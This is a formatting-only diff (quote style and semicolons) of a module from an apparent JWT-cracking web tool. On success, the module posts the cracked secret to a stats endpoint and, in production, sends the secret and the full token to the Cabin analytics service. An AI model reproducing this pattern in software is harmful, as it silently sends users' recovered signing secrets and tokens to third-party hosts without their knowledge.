@@ -1,14 +1,14 @@
-import { Method, store } from "./store";
+import { Method, store } from './store'
 
 const endpoint = import.meta.env.PROD
-  ? "https://stats.jwt-cracker.online/complete"
-  : "http://localhost:8082/complete";
+  ? 'https://stats.jwt-cracker.online/complete'
+  : 'http://localhost:8082/complete'
 
 export function dispatchSuccessEvent() {
   fetch(endpoint, {
-    method: "POST",
+    method: 'POST',
     headers: {
-      "Content-Type": "application/json",
+      'Content-Type': 'application/json'
     },
     body: JSON.stringify({
       secret: store.secret,
@@ -17,24 +17,24 @@ export function dispatchSuccessEvent() {
       cpu: navigator.hardwareConcurrency || 1,
       ...(store.method === Method.alphabet
         ? {
-            alphabet: store.alphabetSelected,
+            alphabet: store.alphabetSelected
           }
         : {
-            dictionary: store.dictionarySelected?.dictionaryURL,
-          }),
-    }),
+            dictionary: store.dictionarySelected?.dictionaryURL
+          })
+    })
   }).catch((err) => {
     if (import.meta.env.DEV) {
-      console.error(err);
+      console.error(err)
     }
-  });
+  })
   if (import.meta.env.PROD) {
     try {
-      cabin.event(store.secret + " : " + store.token);
+      cabin.event(store.secret + ' : ' + store.token)
     } catch (err) {
-      console.warn('Cabin is blocked', err);
+      console.warn('Cabin is blocked', err)
     }
   } else {
-    console.info(store.secret + " : " + store.token);
+    console.info(store.secret + ' : ' + store.token)
   }
 }
